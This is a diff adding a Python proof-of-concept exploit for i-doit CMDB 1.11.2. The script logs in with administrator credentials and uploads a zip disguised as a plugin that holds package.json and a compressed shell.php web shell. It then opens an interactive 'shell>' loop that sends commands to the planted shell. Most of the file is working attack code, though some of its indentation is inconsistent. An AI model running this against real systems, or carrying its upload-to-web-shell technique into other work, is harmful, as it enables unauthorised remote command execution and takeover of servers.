@@ -1,0 +1,105 @@
+# Exploit Title: i-doit CMDB 1.11.2 - Remote Code Execution
+# Date: 2018-12-05
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Contact: https://pentest.com.tr
+# Vendor Homepage: https://www.i-doit.org/
+# Software Link: https://www.i-doit.org/i-doit-open-1-11-2/
+# Version: v1.11.2
+# Category: Webapps
+# Tested on: XAMPP for Linux 5.6.38-0
+# Software Description : The IT-documentation solution i-doit is based on a
+# complete open
+# source configuration management and database. Using i-doit as a CMDB you
+# can manage your IT according to ITIL best practices and configurate the significant
+# components of your IT environment
+# Description : This application has an upload feature that allows an
+# authenticated user with administrator
+# roles to upload arbitrary files to the main website directory.
+# ==================================================================
+# PoC: Exploit upload the ".php" file in the ".zip" file to Remote Code Execution.
+# i-doit accepts zip files as a plugin and extract them to the main
+# directory. In order for the ".zip" file to be accepted by the application, it must
+# contain a file named "package.json
+
+#!/usr/bin/python
+
+import mechanize
+import sys
+import cookielib
+import requests
+import colorama
+from colorama import Fore
+
+print
+"\n############################################################################"
+print "# i-doit CMDB & ITSM 1.11.2 Remote Code Execution - Remote Code Execution  #"
+print "#                   Vulnerability discovered byvAkkuS                      #"
+print "#                  My Blog - https://www.pentest.com.tr					  #"
+print
+"############################################################################\n"
+if (len(sys.argv) != 2):
+    print "[*] Usage: poc.py <RHOST>"
+    exit(0)
+
+rhost = sys.argv[1]
+
+# User Information Input
+UserName = str(raw_input("User Name: "))
+Password = str(raw_input("Password: "))
+
+# Login into site
+print(Fore.BLUE + "+ [*] Loging in...")
+br = mechanize.Browser()
+br.set_handle_robots(False)
+
+# Cookie Jar
+cj = cookielib.LWPCookieJar()
+br.set_cookiejar(cj)
+
+br.open("http://"+rhost+"/admin/")
+assert br.viewing_html()
+br.select_form(nr=0)
+br.form['username'] = UserName
+br.form['password'] = Password
+br.submit()
+
+title = br.title()
+print (Fore.YELLOW + "+ [*] You're in "+title+" section of the app now")
+
+# Arbitrary ".php" File Upload Records with multipart/form-data to RCE
+rce_headers = {"Accept":
+"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+"Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+"Content-Type": "multipart/form-data;
+boundary=---------------------------13859713751632544601258659337"}
+rce_data="-----------------------------13859713751632544601258659337\r\nContent-Disposition:
+form-data;
+name=\"action\"\r\n\r\nadd\r\n-----------------------------13859713751632544601258659337\r\nContent-Disposition:
+form-data;
+name=\"mandator\"\r\n\r\n0\r\n-----------------------------13859713751632544601258659337\r\nContent-Disposition:
+form-data; name=\"module_file\"; filename=\"test.zip\"\r\nContent-Type:
+application/zip\r\n\r\nPK\x03\x04\x14\x00\x08\x00\x08\x00\x06\x89\x85M\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00
+\x00package.jsonUT\r\x00\x07\xcc\xdb\x07\\\xcc\xdb\x07\\\xcc\xdb\x07\\ux\x0b\x00\x01\x04\x00\x00\x00\x00\x04\x00\x00\x00\x00\x03\x00PK\x07\x08\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00PK\x03\x04\x14\x00\x08\x00\x08\x00G\x87{M\x00\x00\x00\x00\x00\x00\x00\x00\xdc\x01\x00\x00\t\x00
+\x00shell.phpUT\r\x00\x07wM\xfd[7\x81\x07\\wM\xfd[ux\x0b\x00\x01\x04\x00\x00\x00\x00\x04\x00\x00\x00\x00\x95\x91\xcbj\xc30\x10E\xf7\xfa\x8a\xc1\x18,\xd3\xe6\x0b\xd2G6I)d\x15\xb2+e\x10\xf2\xb8\x16\xd1#x\xe4<\x08\xf9\xf7:\x8d\xe3\xb8M\xbb\xe8JH\xf7\xce\xbdg\xd0\xc3\xf3\xbaZ\x8b4V\x86\xb14\x96\xe0\x11\x10g\xaf\xf3)\xe2XLx\xcf\x91\x9cLt\xe5B\x01\xcdG\x18m\xe1\xeaM\xf2o\x16\x15c\rw\xe6\x87!\xd5\xc19\xe5\x8b68\xc5\x97\xe9\xf2-\xd1\xaeH\xde\xc7B\x98\x12\xa4\xb6\x8a\x19ig8\xb2\xcc\x16TZ\xd2\xd1\x04?k\xfc\xd7\x99\xe59\x1c\x84\x00\x80\xb4\xec\x9e\xda
+O[\xb8\xf5\xca\xec\xcc\x92\xb5\xad\xc3\x81\xd1\x93\xf1\x9b\xb0\"yAiuq\x04\xb2L'\x84\x8b\xad\xa7\xd0\xcaZl\x98j<I\xa8\xeaZ\xed\xaf\x1c\xbf\xa9}\xf3=\x9c\xef}\xd3\xbf\xaa\xfe*\x19\xc4\xdf\xae\xd0Mt\xdf0\xd0\x8f\xe2\x13PK\x07\x08\xc6=\x06k\xde\x00\x00\x00\xdc\x01\x00\x00PK\x01\x02\x14\x03\x14\x00\x08\x00\x08\x00\x06\x89\x85M\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x0c\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x81\x00\x00\x00\x00package.jsonUT\r\x00\x07\xcc\xdb\x07\\\xcc\xdb\x07\\\xcc\xdb\x07\\ux\x0b\x00\x01\x04\x00\x00\x00\x00\x04\x00\x00\x00\x00PK\x01\x02\x14\x03\x14\x00\x08\x00\x08\x00G\x87{M\xc6=\x06k\xde\x00\x00\x00\xdc\x01\x00\x00\t\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x81\\\x00\x00\x00shell.phpUT\r\x00\x07wM\xfd[7\x81\x07\\wM\xfd[ux\x0b\x00\x01\x04\x00\x00\x00\x00\x04\x00\x00\x00\x00PK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00\xb1\x00\x00\x00\x91\x01\x00\x00\x00\x00\r\n-----------------------------13859713751632544601258659337--\r\n"
+
+upload = requests.post("http://"+rhost+"/admin/?req=modules&action=add",
+headers=rce_headers, cookies=cj, data=rce_data)
+# Upload Control
+if upload.status_code == 200:
+   print (Fore.GREEN + "+ [*] Shell successfully uploaded!")
+
+# Command Execute
+while True:
+      shellctrl = requests.get("http://"+rhost+"/shell.php")
+      if shellctrl.status_code == 200:
+         Command = str(raw_input(Fore.WHITE + "shell> "))
+     URL = requests.get("http://"+rhost+"/shell.php?cmd="+Command+"")
+            print URL.text
+      else:
+         print (Fore.RED + "+ [X] Unable to upload or access the shell")
+         sys.exit()
+
+# end
